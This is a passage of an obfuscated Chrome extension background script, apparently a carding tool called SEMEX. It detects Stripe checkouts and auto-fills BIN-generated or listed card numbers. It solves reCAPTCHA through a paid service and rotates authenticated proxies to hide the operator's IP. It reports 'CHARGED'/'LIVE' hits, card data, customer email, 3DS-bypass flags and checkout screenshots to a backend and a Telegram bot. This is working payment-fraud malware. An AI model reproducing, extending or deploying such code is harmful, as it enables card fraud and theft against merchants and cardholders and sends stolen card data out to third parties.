                    await fetch(_ownBotBase + "/sendPhoto", { method: "POST", body: _fd });
                  } else {
                    // No screenshot — plain text fallback.
                    await fetch(_ownBotBase + "/sendMessage", {
                      method: "POST",
                      headers: { "Content-Type": "application/json" },
                      body: JSON.stringify({ chat_id: _semexBotUid, text: _semexBotText, parse_mode: "HTML" })
                    });
                  }
                } catch (_eBotSend) {
                  console.warn("[SEMEX/bg] own-bot send failed:", _eBotSend && _eBotSend.message);
                  // Notify overlay so the user sees the failure (Task #19 handler picks this up).
                  try {
                    chrome.runtime.sendMessage({ type: "SEMEX_OWN_BOT_FAIL", error: (_eBotSend && _eBotSend.message) || "send failed" });
                  } catch (_eNotify) {}
                }
              })();
            }
          }
        }
      } catch (_eBotCfg) {
        console.warn("[SEMEX/bg] own-bot forwarding error:", _eBotCfg && _eBotCfg.message);
      }
      let _0xsemexResp = null;
      try {
        _0xsemexResp = await serverClient.submitStatus({
          status: _0x2d827f.status,
          gateway: _0xdetails.gateway,
          url: _0xdetails.url,
          siteUrl: _0xdetails.siteUrl,
          hostname: _0xdetails.hostname,
          response: _0xdetails.response,
          card: _semexCard,
          declineCode: _0xdetails.declineCode,
          errorCode: _0xdetails.errorCode,
          declineReason: _0xdetails.declineReason,
          amount: _semexAmt,
          currency: _0xdetails.currency,
          customerEmail: _0xdetails.customerEmail,
          merchant: _0xdetails.merchant,
          productName: _0xdetails.productName,
          successUrl: _0xdetails.successUrl,
          threeDSBypassed: _0xdetails.threeDSBypassed,
          screenshot: _0x4f463b,
          submitId: _submitId
        });
        console.log("[SEMEX/bg] submitStatus response:", _0xsemexResp);
        // v5.0.1 FIX: the old check used `_http===200` as an OR branch, which meant
        // backend drops that return HTTP 200 with {success:false, dropped:"zero_amount"}
        // were silently treated as success — overlay showed "Hit saved" but nothing
        // reached Telegram.  Now: HTTP-status fallback only fires when `success` is
        // absent (legacy endpoint); an explicit `success:false` always wins.
        const _0xok = _0xsemexResp && (
          _0xsemexResp.success === true ||
          ((_0xsemexResp._http === 200 || _0xsemexResp._http === 201) && _0xsemexResp.success !== false)
        ) && !_0xsemexResp.error && !_0xsemexResp._error;
        if (_0xok) {
          // Refresh the in-flight reservation with the confirmed submit timestamp.
          try { _semexHitCache.set(_semexHitKey, Date.now()); } catch (_eHc) {}
          notifyBackendResult(_0xtabId, true, "Hit saved to server", _0x2d827f.status);
          await _0xstoreLast(true, "saved", (_0xsemexResp && _0xsemexResp._http) || 200, _0xsemexResp && _0xsemexResp.forwarded);
        } else {
          // Submit failed — clear the reservation so the operator can retry.
          try { _semexHitCache.delete(_semexHitKey); } catch (_eHd) {}
          // Include the backend's `dropped` field in the error message so the overlay
          // gives actionable context ("dropped: zero_amount" instead of "unknown error").
          const _0xdropped = _0xsemexResp && _0xsemexResp.dropped;
          const _0xreason = (_0xsemexResp && (
            (_0xdropped ? "dropped: " + _0xdropped : null) ||
            _0xsemexResp.error || _0xsemexResp._error ||
            (_0xsemexResp._http ? "HTTP " + _0xsemexResp._http : "")
          )) || "unknown error";
          notifyBackendResult(_0xtabId, false, "Server not saved: " + _0xreason, _0x2d827f.status);
          await _0xstoreLast(false, _0xreason, (_0xsemexResp && _0xsemexResp._http) || 0, false);
        }
      } catch (_0x398861) {
        const _0xmsg = _0x398861 && _0x398861.message ? _0x398861.message : String(_0x398861);
        console.error("[SEMEX/bg] submitStatus threw:", _0xmsg);
        // Clear the in-flight reservation so the operator can retry the same hit
        // after a transient network failure (e.g. brief connectivity loss).
        // Without this, the 12-second dedup window silently drops the retry.
        try { _semexHitCache.delete(_semexHitKey); } catch (_eHdEx) {}
        notifyBackendResult(_0xtabId, false, "Server error: " + _0xmsg, _0x2d827f.status);
        await _0xstoreLast(false, _0xmsg, 0, false);
      }
      // v2.9.2: fallback ONLY — if the capture budget expired, the hit already
      // went out as text; retry one silent capture here and deliver the photo
      // via the follow-up endpoint so the owner still gets the screenshot.
      try {
        let _shotB64 = null;
        // v2.9.4: the fallback MUST respect the same status gate as the primary
        // capture — without it, DEAD hits (null primary shot) triggered a
        // fallback capture + /screenshot upload, and the backend DMed a photo
        // for a dead card. That was the "DEAD in DM" leak.
        if (!_0x4f463b && _semexShotStatuses.indexOf(_0x2d827f.status) !== -1) {
          try {
            const _retryWin = _0x393846 && _0x393846.tab && _0x393846.tab.windowId;
            const _retryTab = _0x393846 && _0x393846.tab && _0x393846.tab.id;
            // Focus the checkout tab first — on mobile/Kiwi, captureVisibleTab
            // grabs the focused window's active tab, so a background retry can
            // otherwise photograph the wrong page entirely.
            try { if (_retryTab != null) await new Promise(_r => chrome.tabs.update(_retryTab, { active: true }, () => { void chrome.runtime.lastError; _r(); })); } catch (_e) {}
            try { if (chrome.windows && _retryWin != null) await new Promise(_r => chrome.windows.update(_retryWin, { focused: true }, () => { void chrome.runtime.lastError; _r(); })); } catch (_e) {}
            const _dataUrl = await Promise.race([
              chrome.tabs.captureVisibleTab(_retryWin != null ? _retryWin : null, { format: "png" }),
              new Promise((_res, _rej) => setTimeout(() => _rej(new Error("capture timeout")), 4000))
            ]);
            if (_dataUrl && _dataUrl.length > 100) {
              _shotB64 = _dataUrl.split(",")[1];
            }
          } catch (_eRC) {}
        }
        if (_shotB64) {
          // CHARGED: save fallback shot to device too. LIVE/others: Telegram-only.
          if (_0x2d827f.status === "CHARGED" && chrome.downloads) {
            const _fbHost = ((_0xdetails.siteUrl || _0xdetails.hostname || "unknown") + "").replace(/^https?:\/\//, "").replace(/[^a-z0-9]/gi, "_") || "unknown";
            const _fbTs = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
            try {
              await chrome.downloads.download({
                url: "data:image/jpeg;base64," + _shotB64,
                filename: "SEMEX_CHARGED_" + _fbHost + "_" + _fbTs + ".jpg",
                conflictAction: "uniquify",
                saveAs: false
              });
            } catch (_eFbDl) {}
          }
          await serverClient.authedFetch("/api/data/screenshot", {
            method: "POST",
            body: JSON.stringify({
              hitId: (_0xsemexResp && _0xsemexResp.hitId) || null,
              submitId: _submitId,
              screenshot: _shotB64,
              status: _0x2d827f.status || "",
              siteUrl: _0xdetails.siteUrl || _0xdetails.hostname || ""
            })
          });
        }
      } catch (_eShotUp) {
        console.warn("[SEMEX/bg] screenshot follow-up failed:", _eShotUp && _eShotUp.message);
      }
      // All async work done — stop the keepalive ping and release the worker.
      try { clearInterval(_0xKeepaliveTimer); } catch (_eck) {}
      try { _0x2ece2b({ received: true }); } catch (e) {}
    })();
    return true;
  }
  if (_0x2d827f.type === "FETCH_INSTRUCTIONS") {
    const {
      url: _0x26a198,
      method: _0x55f836,
      gateway: _0x132acf,
      isCheckout: _0x1e2b89
    } = _0x2d827f;
    serverClient.fetchInstructions(_0x26a198, _0x55f836, _0x132acf, _0x1e2b89).then(_0x1c77b2 => {
      try {
        _0x2ece2b(_0x1c77b2);
      } catch (_0x24a5c9) {}
    }).catch(_0x3d9d56 => {
      try {
        _0x2ece2b(null);
      } catch (_0x2396b6) {}
    });
    return true;
  }
  if (_0x2d827f.type === "GET_SESSION_RULES") {
    chrome.storage.session.get(["bypassRules"]).then(_0x396c69 => {
      _0x2ece2b({
        rules: _0x396c69.bypassRules || null
      });
    }).catch(_0x412da0 => {
      _0x2ece2b({
        rules: null
      });
    });
    return true;
  }
  if (_0x2d827f.type === "GET_ADDRESS") {
    const _0x2d5f12 = _0x2d827f.country || "US";
    const _0x1b3721 = _0x2d827f.random || false;
    serverClient.getAddress(_0x2d5f12, _0x1b3721).then(_0x329f2d => {
      if (_0x329f2d && _0x329f2d.error) {
        _0x2ece2b({
          success: false,
          error: "Authentication required"
        });
        return;
      }
      _0x2ece2b({
        success: true,
        address: _0x329f2d
      });
    }).catch(_0x5906a9 => {
      _0x2ece2b({
        success: false,
        error: _0x5906a9.message
      });
    });
    return true;
  }
  if (_0x2d827f.type === "GET_USER") {
    serverClient.getUser().then(_0x1bdcaa => {
      if (_0x1bdcaa && _0x1bdcaa.error) {
        _0x2ece2b({
          success: false,
          error: "Authentication required"
        });
        return;
      }
      _0x2ece2b({
        success: true,
        user: _0x1bdcaa
      });
    }).catch(_0x331979 => {
      _0x2ece2b({
        success: false,
        error: _0x331979.message
      });
    });
    return true;
  }
});
const BUFFER_SIZE = 10;
const REFILL_THRESHOLD = 3;
serverClient.init().then(async () => {
  await Promise.all([loadSessionRules(), manageAddressBuffer()]);
}).catch(_0xinitErr => {
  // BUGFIX: init failure was an unhandled rejection in the MV3 worker.
  console.warn("[SEMEX/bg] serverClient init failed:", _0xinitErr && _0xinitErr.message);
});
async function manageAddressBuffer() {
  try {
    if (!chrome.storage.session) {
      return;
    }
    const _0x3495c9 = await chrome.storage.session.get("__xcabuf");
    // BUGFIX: same key mismatch as GET_CACHED_FORM_DATA — read "__xcabuf".
    let _0x2e6798 = (_0x3495c9 && _0x3495c9.__xcabuf) || [];
    if (_0x2e6798.length < BUFFER_SIZE) {
      const _0x1e1093 = BUFFER_SIZE - _0x2e6798.length;
      const _0x31719a = [];
      for (let _0x170123 = 0; _0x170123 < _0x1e1093; _0x170123++) {
        _0x31719a.push(fetchSingleFormData());
      }
      const _0x185616 = await Promise.all(_0x31719a);
      const _0x2a6d12 = _0x185616.filter(_0x1ab51d => _0x1ab51d !== null);
      if (_0x2a6d12.length > 0) {
        const _0x33e8a0 = _0x2a6d12[0];
        const _0x3c4165 = _0x33e8a0.country || "Unknown";
        _0x2e6798 = [..._0x2e6798, ..._0x2a6d12];
        await chrome.storage.session.set({
          __xcabuf: _0x2e6798
        });
      }
    }
  } catch (_0x7498f8) {}
}
__name(manageAddressBuffer, "manageAddressBuffer");
async function fetchSingleFormData() {
  try {
    const _0x35b657 = await chrome.storage.local.get("settings");
    const _0xa360dc = _0x35b657.settings || {};
    const _0x2c190f = _0xa360dc.addressCountry || "US";
    const _0x4ac0be = _0xa360dc.addressCountryRandom || false;
    const _0x292c52 = await serverClient.getAddress(_0x2c190f, _0x4ac0be);
    const _0x33eb67 = await serverClient.getUser();
    const _0x48d816 = await serverClient.getSelectors("checkout.stripe.com", true);
    if (_0x292c52 && !_0x292c52.error && _0x48d816 && !_0x48d816.error) {
      return {
        address: _0x292c52,
        user: _0x33eb67,
        // getSelectors() returns a WRAPPER {selectors, delays, iframe} — store
        // the inner selector map, not the wrapper. Storing the wrapper left
        // selectors.country/.cardNumber/... undefined downstream, so fillForm
        // silently no-op'd while reporting success ("Waiting response..." with
        // an empty form). CHECK_CONFIG's direct path unwraps correctly (":428").
        selectors: _0x48d816.selectors || _0x48d816,
        country: _0x2c190f,
        domain: "checkout.stripe.com", // prefetch buffer holds the Stripe-generic profile
        timestamp: Date.now(),
        id: crypto.randomUUID()
      };
    }
    return null;
  } catch (_0x2b80b8) {
    return null;
  }
}
__name(fetchSingleFormData, "fetchSingleFormData");
async function loadSessionRules() {
  try {
    if (!chrome.storage.session) {
      return;
    }
    const _0x3d51f2 = await serverClient.fetchSessionRules();
    if (_0x3d51f2) {
      await chrome.storage.session.set({
        bypassRules: _0x3d51f2
      });
    } else {}
  } catch (_0x3d9d1e) {}
}
__name(loadSessionRules, "loadSessionRules");
let currentProxy = null;
let currentAuthHandler = null;
const BYPASS_LIST = ["localhost", "127.0.0.1", "::1", "<local>", "semex.example.com", "*.semex.example.com", "fuckzionist.com", "*.fuckzionist.com", "api.telegram.org", "*.up.railway.app", "*.railway.app", "semexbackend-production.up.railway.app", "api.semxhitter.pw", "semxhitter.pw", "*.semxhitter.pw"];
// Hosts that failed to tunnel through the proxy this session. They are added to
// the bypass list so the page can FAIL-OPEN (load directly) instead of showing
// ERR_TUNNEL_CONNECTION_FAILED. Reset whenever the user activates a fresh proxy,
// giving the new proxy another chance to carry the checkout on its own IP.
const _failoverBypass = new Set();
async function buildBypassList() {
  const _0xlist = BYPASS_LIST.slice();
  for (const _fb of _failoverBypass) { if (!_0xlist.includes(_fb)) _0xlist.push(_fb); }
  try {
    let _0xurl = (serverClient && serverClient.baseUrl) || "";
    try {
      const _0xstored = await chrome.storage.local.get("__xaurl");
      // v2.8.6 FIX: key was read as "__xaurl" but the property was checked as
      // "semexApiUrl" (the pre-migration name) — so a custom API host was never
      // added to the proxy bypass list and every API call died behind a proxy.
      if (_0xstored && _0xstored.__xaurl) _0xurl = _0xstored.__xaurl;
    } catch (e) {}
    if (_0xurl) {
      const _0xhost = new URL(_0xurl).hostname;
      if (_0xhost && !_0xlist.includes(_0xhost)) _0xlist.push(_0xhost);
    }
  } catch (e) {}
  return _0xlist;
}
__name(buildBypassList, "buildBypassList");
function normalizeProxyScheme(_0x494e47) {
  if (!_0x494e47) {
    return "http";
  }
  const _0x2a650a = String(_0x494e47).toLowerCase();
  // Chromium proxy API accepts: "http", "https", "quic", "socks4", "socks5", "direct"
  if (_0x2a650a === "https" || _0x2a650a === "http/s" || _0x2a650a === "http-https") {
    return "https";
  }
  if (_0x2a650a === "socks4" || _0x2a650a === "socks5") {
    return _0x2a650a;
  }
  if (_0x2a650a === "socks" || _0x2a650a === "socks5h") {
    return "socks5";
  }
  return "http";
}
__name(normalizeProxyScheme, "normalizeProxyScheme");
function removeAuthHandler() {
  if (currentAuthHandler) {
    try {
      chrome.webRequest.onAuthRequired.removeListener(currentAuthHandler);
    } catch (_0xab7aa0) {}
    currentAuthHandler = null;
  }
}
__name(removeAuthHandler, "removeAuthHandler");
// Serialize proxy mutations so an MV3-restart bootstrap, a user toggle, and a
// proxy test can never interleave and tear the settings/auth-handler pair.
let _semexProxyQueue = Promise.resolve();
function _semexWithProxyLock(_0xfnb) {
  const _0xrun = _semexProxyQueue.then(() => _0xfnb());
  _semexProxyQueue = _0xrun.catch(() => {});
  return _0xrun;
}
__name(_semexWithProxyLock, "_semexWithProxyLock");
async function activateProxy(_0x229f3b) {
  try {
    if (!_0x229f3b || !_0x229f3b.host || !_0x229f3b.port) {
      throw new Error("Invalid proxy configuration");
    }
    const _0x5de7e9 = parseInt(_0x229f3b.port, 10);
    if (isNaN(_0x5de7e9) || _0x5de7e9 < 1 || _0x5de7e9 > 65535) {
      throw new Error("Invalid port number");
    }
    if (!chrome.proxy || !chrome.proxy.settings) {
      throw new Error("Proxy API not available");
    }
    // Build the new auth handler up front, but do NOT swap it in yet — if the
    // settings write below fails, the OLD proxy stays configured in Chrome and
    // must keep its OLD auth handler or every request starts 407-looping.
    let _0xNewAuth = null;
    if (_0x229f3b.username && _0x229f3b.password) {
      _0xNewAuth = __name(_0x16d302 => {
        // Only answer PROXY auth challenges. If we blindly returned the proxy
        // credentials for a *site's* Basic-Auth 401 (isProxy === false), the page
        // would auth-loop and never load — one cause of "a valid proxy sometimes
        // stops the checkout from opening". Abstain on non-proxy challenges.
        if (_0x16d302 && _0x16d302.isProxy === false) return {};
        return {
          authCredentials: {
            username: _0x229f3b.username,
            password: _0x229f3b.password
          }
        };
      }, "_0xNewAuth");
    }
    const _0x4174c2 = normalizeProxyScheme(_0x229f3b.type || "http");
    const _0xbypass = await buildBypassList();
    const _0xa4f4c2 = {
      mode: "fixed_servers",
      rules: {
        singleProxy: {
          scheme: _0x4174c2,
          host: _0x229f3b.host,
          port: _0x5de7e9
        },
        bypassList: _0xbypass
      }
    };
    await new Promise((_0x4ca38f, _0x10c680) => {
      chrome.proxy.settings.set({
        value: _0xa4f4c2,
        scope: "regular"
      }, () => {
        if (chrome.runtime.lastError) {
          _0x10c680(new Error(chrome.runtime.lastError.message));
        } else {
          _0x4ca38f();
        }
      });
    });
    // Settings applied — NOW it is safe to swap the auth handler.
    removeAuthHandler();
    if (_0xNewAuth) {
      currentAuthHandler = _0xNewAuth;
      chrome.webRequest.onAuthRequired.addListener(currentAuthHandler, {
        urls: ["<all_urls>"]
      }, ["blocking"]);
    }
    currentProxy = _0x229f3b;
    // Normalize the proxy country so "address follows proxy" can read it
    // directly — previously only activeProxy.geo was stored and the fill
    // logic read proxyState.countryCode, which was never written (→ always US).
    let _0xcc = null;
    const _0xgeo = _0x229f3b.geo;
    if (_0xgeo) {
      const _0xraw = typeof _0xgeo === "string" ? _0xgeo : (_0xgeo.countryCode || _0xgeo.country || _0xgeo.country_code || null);
      if (typeof _0xraw === "string") {
        const _0xm = _0xraw.match(/[A-Za-z]{2}/);
        if (_0xm) _0xcc = _0xm[0].toUpperCase();
      }
    }
    await chrome.storage.local.set({
      proxyState: {
        isActive: true,
        activeProxyId: _0x229f3b.id || null,
        countryCode: _0xcc,
        activeProxy: {
          id: _0x229f3b.id,
          host: _0x229f3b.host,
          port: _0x229f3b.port,
          type: _0x229f3b.type || "http",
          username: _0x229f3b.username || "",
          password: _0x229f3b.password || "",
          geo: _0x229f3b.geo || null,
          latency: _0x229f3b.latency || null
        }
      }
    });
    return true;
  } catch (_0x1fcd26) {
    throw _0x1fcd26;
  }
}
__name(activateProxy, "activateProxy");
async function disableProxy() {
  try {
    if (chrome.proxy && chrome.proxy.settings) {
      const _0xsetErr = await new Promise(_0x1d42ec => {
        chrome.proxy.settings.set({
          value: {
            mode: "direct"
          },
          scope: "regular"
        }, () => _0x1d42ec(chrome.runtime.lastError ? chrome.runtime.lastError.message : null));
      });
      if (_0xsetErr) {
        // Chrome rejected the change — keep the auth handler and stored state
        // or the still-active proxy silently loses authentication.
        console.warn("[SEMEX/proxy] disable rejected:", _0xsetErr);
        return false;
      }
    }
    removeAuthHandler();
    currentProxy = null;
    await chrome.storage.local.set({
      proxyState: {
        isActive: false,
        activeProxyId: null,
        countryCode: null,
        activeProxy: null
      }
    });
    return true;
  } catch (_0x40b409) {
    return false;
  }
}
__name(disableProxy, "disableProxy");
async function restoreProxyOnStartup() {
  try {
    if (currentProxy) {
      return; // already live in this worker — don't tear down a working pair
    }
    const {
      proxyState: _0x4561f6
    } = await chrome.storage.local.get("proxyState");
    if ((_0x4561f6 == null ? undefined : _0x4561f6.isActive) && _0x4561f6.activeProxy) {
      await activateProxy(_0x4561f6.activeProxy);
    }
  } catch (_0x1bebb7) {}
}
__name(restoreProxyOnStartup, "restoreProxyOnStartup");
chrome.runtime.onStartup.addListener(() => {
  _semexWithProxyLock(restoreProxyOnStartup);
});
chrome.runtime.onInstalled.addListener(() => {
  _semexWithProxyLock(restoreProxyOnStartup);
});
// MV3 CRITICAL: the service worker is suspended and restarted constantly —
// onStartup/onInstalled do NOT cover ordinary worker restarts. Chrome keeps the
// persisted proxy.settings, but the in-memory auth handler is gone, so
// authenticated proxies 407-loop after every worker cycle. Re-apply persisted
// state (serialized with any in-flight user proxy op) at every worker boot.
_semexWithProxyLock(restoreProxyOnStartup);
async function testProxy(_proxy, _options = {}) {
  // REAL proxy test — was previously stubbed (returned success:true blind).
  // Steps:
  //   1. Save the currently-active proxy state (if any)
  //   2. Temporarily apply the test proxy via chrome.proxy.settings
  //   3. Fetch a geo/IP endpoint through it with a hard timeout
  //   4. Restore the previous proxy state (or go direct if none was active)
  //   5. Return { success, ip, latency, geo, error }
  if (!_proxy || !_proxy.host || !_proxy.port) {
    return { success: false, error: "Invalid proxy: missing host or port" };
  }
  const _port = parseInt(_proxy.port, 10);
  if (isNaN(_port) || _port < 1 || _port > 65535) {
    return { success: false, error: "Invalid port number" };
  }
  if (!chrome.proxy || !chrome.proxy.settings) {
    return { success: false, error: "Proxy API not available in this browser" };
  }

  const _scheme = normalizeProxyScheme(_proxy.type || "http");
  const _bypass = await buildBypassList();

  // Snapshot the current proxy state so we can restore it after the test.
  const _prevProxy = currentProxy;
  const _prevAuthHandler = currentAuthHandler;
  // Detach any existing auth handler so it doesn't collide with the test proxy's creds.
  removeAuthHandler();

  // Install auth handler for the test proxy if creds provided.
  let _testAuthHandler = null;
  if (_proxy.username && _proxy.password) {
    _testAuthHandler = (_details) => {
      // Same rule as activateProxy: only answer PROXY auth challenges.
      // Returning proxy creds for a site's Basic-Auth 401 (isProxy === false)
      // would auth-loop the page during the test window.
      if (_details && _details.isProxy === false) return {};
      return {
        authCredentials: { username: _proxy.username, password: _proxy.password }
      };
    };
    try {
      chrome.webRequest.onAuthRequired.addListener(_testAuthHandler, { urls: ["<all_urls>"] }, ["blocking"]);
    } catch (e) { /* MV3 without <all_urls> perm — non-fatal, non-auth proxies still work */ }
  }

  const _applyProxy = (_config) => new Promise((_res, _rej) => {
    try {
      chrome.proxy.settings.set({ value: _config, scope: "regular" }, () => {
        if (chrome.runtime.lastError) _rej(new Error(chrome.runtime.lastError.message));
        else _res();
      });
    } catch (e) { _rej(e); }
  });

  const _restore = async () => {
    try {
      if (_testAuthHandler) {
        try { chrome.webRequest.onAuthRequired.removeListener(_testAuthHandler); } catch (e) {}
      }
      if (_prevProxy) {
        // Restore previous proxy (activateProxy re-installs its own auth handler)
        try { await activateProxy(_prevProxy); } catch (e) {}
      } else {
        // No previous proxy — go direct
        await _applyProxy({ mode: "direct" });
        // Re-attach previous auth handler if there was one (should be null in this branch)
        if (_prevAuthHandler) {
          try { chrome.webRequest.onAuthRequired.addListener(_prevAuthHandler, { urls: ["<all_urls>"] }, ["blocking"]); currentAuthHandler = _prevAuthHandler; } catch (e) {}
        }
      }
    } catch (e) { /* swallow — best-effort restore */ }
  };

  const _timeoutMs = Math.max(3000, Math.min(20000, (_options && _options.timeoutMs) || 12000));

  try {
    // Apply the test proxy
    await _applyProxy({
      mode: "fixed_servers",
      rules: {
        singleProxy: { scheme: _scheme, host: _proxy.host, port: _port },
        bypassList: _bypass
      }
    });

    // Fire the geo lookup through the proxy with a hard timeout
    const _t0 = Date.now();
    const _ac = new AbortController();
    const _to = setTimeout(() => _ac.abort(), _timeoutMs);
    let _geo = null;
    let _err = null;
    let _ip = null;
    try {
      // Try multiple geo endpoints so a single provider being rate-limited
      // or blocked by the exit doesn't fail the whole test.
      const _providers = [
        {
          url: "https://ipwho.is/?_=" + Date.now(),
          parse: (d) => (!d || d.success === false) ? null : {
            ip: d.ip,
            country: d.country_code || "",
            countryName: d.country || "",
            city: d.city || "",
            region: d.region || "",
            flag: (d.flag && d.flag.emoji) || "",
          },
        },
        {
          url: "https://ipapi.co/json/?_=" + Date.now(),
          parse: (d) => (!d || d.error) ? null : {
            ip: d.ip,
            country: d.country_code || d.country || "",
            countryName: d.country_name || "",
            city: d.city || "",
            region: d.region || "",
            flag: "",
          },
        },
        {
          url: "https://api.ipify.org/?format=json&_=" + Date.now(),
          parse: (d) => (!d || !d.ip) ? null : { ip: d.ip, country: "", countryName: "", city: "", region: "", flag: "" },
        },
      ];
      let _lastErr = null;
      for (const _p of _providers) {
        try {
          const _resp = await fetch(_p.url, { method: "GET", cache: "no-store", signal: _ac.signal });
          if (!_resp.ok) { _lastErr = new Error("HTTP " + _resp.status); continue; }
          const _data = await _resp.json();
          const _g = _p.parse(_data);
          if (_g && _g.ip) {
            _ip = _g.ip;
            _geo = Object.assign({}, _g, {
              location: [_g.city, _g.region].filter(Boolean).join(", "),
            });
            _err = null;
            break;
          }
          _lastErr = new Error("no ip in response");
        } catch (_pe) {
          _lastErr = _pe;
          if (_pe && _pe.name === "AbortError") break;
        }
      }
      if (!_ip) _err = _lastErr ? (_lastErr.name === "AbortError" ? ("Timeout after " + _timeoutMs + "ms") : (_lastErr.message || String(_lastErr))) : "No IP returned from any geo provider";
    } catch (e) {
      _err = (e && e.name === "AbortError") ? ("Timeout after " + _timeoutMs + "ms") : (e && e.message || String(e));
    } finally {
      clearTimeout(_to);
    }
    const _latency = Date.now() - _t0;

    // Always restore
    await _restore();

    if (_err || !_geo || !_geo.ip) {
      return { success: false, error: _err || "No response from proxy", latency: _latency };
    }
    return { success: true, ip: _geo.ip, latency: _latency, geo: _geo };
  } catch (_e) {
    await _restore();
    return { success: false, error: _e && _e.message ? _e.message : String(_e) };
  }
}
__name(testProxy, "testProxy");
chrome.runtime.onMessage.addListener((_0x425ab1, _0x1e7969, _0xf52dfc) => {
  if (_0x425ab1.type === "TEST_PROXY") {
    _semexWithProxyLock(() => testProxy(_0x425ab1.proxy, _0x425ab1.options)).then(_0x34a416 => _0xf52dfc(_0x34a416)).catch(_0x5299e0 => _0xf52dfc({
      success: false,
      error: _0x5299e0.message
    }));
    return true;
  }
  if (_0x425ab1.type === "ACTIVATE_PROXY") {
    // Fresh proxy chosen by the user — clear prior fail-open bypasses so this new
    // proxy gets a chance to carry the checkout on its own IP.
    _failoverBypass.clear();
    _semexWithProxyLock(() => activateProxy(_0x425ab1.proxy)).then(() => _0xf52dfc({
      success: true
    })).catch(_0x2734c8 => _0xf52dfc({
      success: false,
      error: _0x2734c8.message
    }));
    return true;
  }
  if (_0x425ab1.type === "DISABLE_PROXY") {
    _semexWithProxyLock(() => disableProxy()).then(_0x5075fb => _0xf52dfc({
      success: _0x5075fb
    })).catch(_0x4e32f8 => _0xf52dfc({
      success: false,
      error: _0x4e32f8.message
    }));
    return true;
  }
  if (_0x425ab1.type === "GET_PROXY_STATUS") {
    _0xf52dfc({
      active: !!currentProxy,
      proxy: currentProxy ? {
        host: currentProxy.host,
        port: currentProxy.port,
        hasAuth: !!currentProxy.username && !!currentProxy.password
      } : null
    });
    return false;
  }
  if (_0x425ab1.type === "SAVE_PROXY") {
    (async () => {
      try {
        const {
          savedProxies = []
        } = await chrome.storage.local.get("savedProxies");
        const _0x547461 = _0x425ab1.proxy;
        _0x547461.id = _0x547461.id || "proxy-" + Date.now();
        _0x547461.savedAt = Date.now();
        const _0x213305 = savedProxies.find(_0x22c0ea => _0x22c0ea.host === _0x547461.host && _0x22c0ea.port === _0x547461.port);
        if (!_0x213305) {
          savedProxies.unshift(_0x547461);
          if (savedProxies.length > 50) {
            savedProxies.pop();
          }
          await chrome.storage.local.set({
            savedProxies: savedProxies
          });
        }
        _0xf52dfc({
          success: true,
          duplicate: !!_0x213305
        });
      } catch (_0x3e9cb1) {
        _0xf52dfc({
          success: false,
          error: _0x3e9cb1.message
        });
      }
    })();
    return true;
  }
  if (_0x425ab1.type === "GET_SAVED_PROXIES") {
    chrome.storage.local.get("savedProxies").then(_0x188347 => {
      _0xf52dfc({
        success: true,
        proxies: _0x188347.savedProxies || []
      });
    }).catch(_0x4674d4 => {
      _0xf52dfc({
        success: false,
        proxies: [],
        error: _0x4674d4.message
      });
    });
    return true;
  }
  if (_0x425ab1.type === "REMOVE_PROXY") {
    (async () => {
      try {
        const {
          savedProxies = []
        } = await chrome.storage.local.get("savedProxies");
        const _0x2bc646 = savedProxies.filter(_0x14f59b => _0x14f59b.id !== _0x425ab1.proxyId);
        await chrome.storage.local.set({
          savedProxies: _0x2bc646
        });
        _0xf52dfc({
          success: true
        });
      } catch (_0x1463d9) {
        _0xf52dfc({
          success: false,
          error: _0x1463d9.message
        });
      }
    })();
    return true;
  }
  if (_0x425ab1.type === "SOLVE_RECAPTCHA_IMAGE") {
    solveRecaptchaWithNopeCHA({
      task: _0x425ab1.task,
      imageData: _0x425ab1.imageData,
      grid: _0x425ab1.grid,
      pageUrl: _0x425ab1.pageUrl
    }).then(_0x1e98b9 => {
      _0xf52dfc(_0x1e98b9);
    }).catch(_0x3a05e3 => {
      _0xf52dfc({
        success: false,
        error: _0x3a05e3.message
      });
    });
    return true;
  }
  if (_0x425ab1.type === "CHECK_NOPECHA_STATUS") {
    getNopechaStatus().then(_0x59b083 => {
      _0xf52dfc(_0x59b083);
    }).catch(_0x53b715 => {
      _0xf52dfc({
        success: false,
        error: _0x53b715.message
      });
    });
    return true;
  }
  if (_0x425ab1.type === "INJECT_OVERLAY") {
    const _semexOlTabId = _0x1e7969.tab.id;
    // Dedup: both STRIPE_CHECKOUT_DETECTED (from interceptor) and
    // _semexWatchEmbeddedStripe (content.js iframe observer) can fire for the
    // same page within milliseconds of each other, causing the overlay to be
    // injected twice and — in autoFill mode — SEMEX_AUTO_FILL to fire twice.
    // Gate to one injection per tab within a 10-second window.
    const _semexOlNow = Date.now();
    const _semexOlLast = _semexInjectedTabs.get(_semexOlTabId);
    if (_semexOlLast && _semexOlNow - _semexOlLast < 10000) return false;
    _semexInjectedTabs.set(_semexOlTabId, _semexOlNow);
    chrome.storage.local.get(["settings"], _semexOlSt => {
      // Always inject the overlay (control panel + stats).
      // Also always auto-fill the form ~1.5s after checkout detection so
      // the card fields are ready before the user clicks Start — no setting
      // required, matching the Jetix / dot-bypasser UX.
      chrome.scripting.insertCSS({
        target: { tabId: _semexOlTabId },
        files: ["content/overlay.css"]
      }).then(() => {
        chrome.scripting.executeScript({
          target: { tabId: _semexOlTabId },
          files: ["main-world/overlay.js"],
          world: "MAIN"
        });
      }).catch(_semexOlErr => {});
      // Auto-fill: fire after overlay has had time to inject (1500ms).
      // Content.js picks the correct card (BIN-generated or first CC-list entry)
      // and fills all card fields silently — user sees the form already filled.
      setTimeout(() => {
        chrome.tabs.sendMessage(
          _semexOlTabId,
          { type: "SEMEX_AUTO_FILL" },
          { frameId: 0 },
          () => { void chrome.runtime.lastError; }
        );
      }, 1500);
    });
    return false;
  }
});
if (chrome.proxy && chrome.proxy.onProxyError) {
  // Surface proxy errors instead of swallowing them, so a dead/blocked proxy is
  // visible (red badge) rather than a cryptic Chrome error page.
  chrome.proxy.onProxyError.addListener(_0xerr => {
    try {
      console.warn("[SEMEX] proxy error:", _0xerr && _0xerr.error, _0xerr && _0xerr.details);
      chrome.action.setBadgeBackgroundColor({ color: "#dc2626" });
      chrome.action.setBadgeText({ text: "PRX" });
      setTimeout(() => { try { chrome.action.setBadgeText({ text: "" }); } catch (e) {} }, 6000);
    } catch (e) {}
  });
}

// ─── Fail-open failover when the proxy can't tunnel to the checkout ────────────
// If a top-level (main_frame) navigation to a checkout host dies with a proxy /
// tunnel error, add that host to the fail-open bypass and reload the tab so the
// page opens DIRECTLY (on the real IP) instead of ERR_TUNNEL_CONNECTION_FAILED.
// The user explicitly opted into this. We warn loudly (badge + in-page message)
